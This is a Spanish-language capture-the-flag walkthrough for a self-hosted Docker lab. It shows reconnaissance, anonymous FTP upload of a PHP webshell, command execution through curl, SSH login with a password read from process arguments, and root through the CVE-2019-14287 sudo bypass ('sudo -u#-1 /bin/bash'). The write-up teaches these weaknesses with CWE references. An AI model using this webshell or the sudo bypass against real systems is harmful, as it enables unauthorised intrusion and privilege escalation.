# Solucion — OoOps Machine

**Dificultad:** Media  
**Servicios:** FTP, HTTP, SSH  
**Objetivos:**
- Flag 1 (User): `/home/hacker/flag.txt`
- Flag 2 (Root): `/root/flag.txt`

---

## 1. Preparación del entorno

### Construir y arrancar el contenedor

```bash
cd /home/kali/Documents/CTF-Docker/OoOps_machine/
sudo docker build -t ooops_machine .
sudo docker run --rm -d -e IP=<tu-ip-host> --name ooops ooops_machine
```

> Obtén tu IP con: `ip a | grep "inet " | grep -v 127.0.0.1`  
> Usa la IP de la interfaz `eth0` (normalmente `10.0.2.15` en VirtualBox).

### Obtener la IP del contenedor

```bash
sudo docker inspect ooops | grep IPAddress
```

A partir de aquí, usaremos `<IP_CONTENEDOR>` para referirnos a esa IP.

---

## 2. Reconocimiento — Escaneo de puertos

```bash
nmap -sV -sC -p- <IP_CONTENEDOR>
```

**Resultado esperado:**

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21/tcp | FTP | vsftpd 3.0.3 |
| 22/tcp | SSH | OpenSSH 7.6p1 |
| 80/tcp | HTTP | Apache 2.4.29 |

**Hallazgos clave:**
- FTP permite **login anónimo** (`ftp-anon: Anonymous FTP login allowed`)
- El servidor web usa **PHP** (título: "Prueba de PHP")
- SSH disponible para acceso con credenciales

> **Concepto:** Múltiples servicios en un mismo contenedor aumentan la superficie de ataque. Esto viola el principio de mínimo privilegio. (CWE-272)

---

## 3. Enumeración FTP — Acceso anónimo

```bash
ftp <IP_CONTENEDOR>
# Usuario: anonymous
# Contraseña: (vacío o cualquier cosa)
```

Dentro del FTP:

```
ftp> ls -la
# Hay una carpeta: html  (permisos drwxrwxrwx)
ftp> cd html
ftp> ls -la
# index.php  index.html.bak
ftp> get index.php
ftp> get index.html.bak
ftp> bye
```

**Hallazgo crítico:**  
La carpeta `html` es `/var/www/html`, el directorio raíz de Apache.  
Sus permisos `drwxrwxrwx` permiten escritura a **cualquier usuario**, incluyendo el FTP anónimo.

> **Concepto:** FTP anónimo con escritura en el webroot permite subir archivos ejecutables al servidor web. (CWE-434 — Unrestricted File Upload)

---

## 4. Explotación — Subida de webshell PHP

### Crear el webshell

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

### Subirlo por FTP

```bash
ftp <IP_CONTENEDOR>
# Usuario: anonymous / Contraseña: (vacío)
```

```
ftp> cd html
ftp> put /tmp/shell.php shell.php
ftp> bye
```

### Verificar ejecución remota de código (RCE)

```bash
curl "http://<IP_CONTENEDOR>/shell.php?cmd=id"
```

**Resultado esperado:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Concepto:** El servidor ejecuta el código PHP que subimos. Esto se llama RCE (Remote Code Execution). Somos el usuario `www-data`, con privilegios limitados.

---

## 5. Flag 1 — Lectura como www-data

### Enumerar usuarios del sistema

```bash
curl "http://<IP_CONTENEDOR>/shell.php?cmd=ls+/home"
# Resultado: hacker
```

### Leer la Flag 1

```bash
curl "http://<IP_CONTENEDOR>/shell.php?cmd=cat+/home/hacker/flag.txt"
```

**Flag 1 obtenida.** Guárdala.

---

## 6. Escalada a usuario hacker — Credenciales expuestas

Listamos los procesos en ejecución:

```bash
curl "http://<IP_CONTENEDOR>/shell.php?cmd=ps+aux"
```

**Hallazgo crítico:**  
Aparece una línea similar a:
```
root   70   /bin/bash ./myhacker.sh <CONTRASEÑA>
```

La contraseña del usuario `hacker` está visible como argumento del proceso, accesible para cualquier usuario del sistema.

> **Concepto:** Pasar credenciales como argumentos de línea de comandos es una vulnerabilidad grave. Cualquier usuario con acceso a `ps aux` puede leerlas. (CWE-214 — Exposure of Sensitive Information via Process Arguments)

### Conectarse por SSH con las credenciales encontradas

```bash
ssh hacker@<IP_CONTENEDOR>
# Contraseña: <la que encontraste en ps aux>
```

Verificar:
```bash
whoami   # hacker
```

---

## 7. Escalada de privilegios — CVE-2019-14287

### Comprobar permisos sudo

```bash
sudo -l
```

**Resultado:**
```
User hacker may run the following commands:
    (ALL, !root) ALL
```

Esta regla significa: puede ejecutar cualquier comando como cualquier usuario **excepto root**. Parece seguro... pero no lo es.

### Comprobar versión de sudo

```bash
sudo --version
# Sudo version 1.8.26  ← vulnerable
```

### CVE-2019-14287 — Bypass del filtro !root

**El fallo:** Cuando sudo procesa el ID de usuario `-1`, lo convierte internamente a `4294967295` (entero sin signo). Al hacer la operación aritmética, el resultado es `0`, que corresponde a **uid=0 = root**. El filtro `!root` comprueba el nombre "root", no el uid resultante, por lo que no lo bloquea.

**Versiones afectadas:** sudo < 1.8.28

### Explotar la vulnerabilidad

```bash
sudo -u#-1 /bin/bash
```

Verificar:
```bash
whoami   # root
```

> **Concepto:** Las configuraciones de sudo mal aplicadas pueden ser bypasseadas. Siempre actualizar sudo y verificar las reglas con cuidado. Referencia: CVE-2019-14287.

---

## 8. Flag 2 — Lectura como root

```bash
cat /root/flag.txt
```

**Flag 2 obtenida.**

---

## Resumen de vulnerabilidades

| # | Vulnerabilidad | Referencia |
|---|----------------|------------|
| 1 | FTP anónimo con escritura en webroot | CWE-272, CWE-434 |
| 2 | RCE via webshell PHP | OWASP A03 |
| 3 | Credenciales expuestas en argumentos de proceso | CWE-214 |
| 4 | Sudo mal configurado + versión vulnerable | CVE-2019-14287 |

---

## Cyber Kill Chain

Visión panorámica de la cadena de ataque completa siguiendo el modelo Lockheed Martin:

Ver [kill_chain.md](./kill_chain.md)

---

## Comandos de limpieza

```bash
sudo docker stop ooops
```
